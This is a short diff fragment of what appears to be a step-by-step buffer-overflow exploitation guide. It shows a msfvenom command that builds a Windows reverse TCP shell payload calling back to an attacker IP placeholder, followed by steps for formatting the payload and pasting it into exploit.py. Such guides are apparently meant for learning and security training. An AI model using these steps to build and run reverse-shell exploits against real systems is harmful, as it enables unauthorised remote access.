@@ -171,6 +171,8 @@ For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=[ATTACK-IP] LPORT=4444 EXITFUNC=thread -b "[BAD-CHARACTORS]" -f c
 ```
+*Remove quotation marks "" and Wrap output/payload variable in parentheses ()*
+
 
 * Step 28: Paste generated payload into payload variable of exploit.py
 
